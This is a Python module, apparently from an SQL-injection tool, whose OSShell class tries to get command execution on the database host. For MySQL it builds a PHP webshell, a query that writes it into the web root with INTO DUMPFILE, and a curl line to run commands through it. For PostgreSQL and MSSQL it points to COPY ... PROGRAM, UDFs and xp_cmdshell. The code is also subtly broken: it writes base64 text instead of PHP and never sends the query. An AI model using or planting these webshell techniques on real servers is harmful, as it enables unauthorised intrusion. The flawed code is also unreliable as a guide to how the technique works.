import base64
import logging
from lib.request.client import Request

logger = logging.getLogger(__name__)

class OSShell:
    def __init__(self, settings, session, vuln, dbms):
        self.settings = settings
        self.request = Request(session, settings)
        self.vuln = vuln
        self.dbms = dbms
        
    def interact(self):
        if self.dbms == 'MySQL':
            self._mysql_shell()
        elif self.dbms == 'PostgreSQL':
            self._pgsql_shell()
        elif self.dbms == 'MSSQL':
            self._mssql_shell()
        else:
            logger.error("OS shell not supported for this DBMS")
            return
    
    def _mysql_shell(self):
        # Try to write a webshell first
        webshell = "<?php system($_GET['cmd']); ?>"
        b64 = base64.b64encode(webshell.encode()).decode()
        query = f"SELECT '{b64}' INTO DUMPFILE '/var/www/html/shell.php'"
        # Use boolean injection to execute
        # Simplified: just print instructions
        logger.info("Attempting to write webshell via INTO OUTFILE...")
        logger.info("If successful, use: curl http://target/shell.php?cmd=id")
        
    def _pgsql_shell(self):
        logger.info("PostgreSQL: use COPY ... PROGRAM or UDF")
        
    def _mssql_shell(self):
        logger.info("MSSQL: use xp_cmdshell")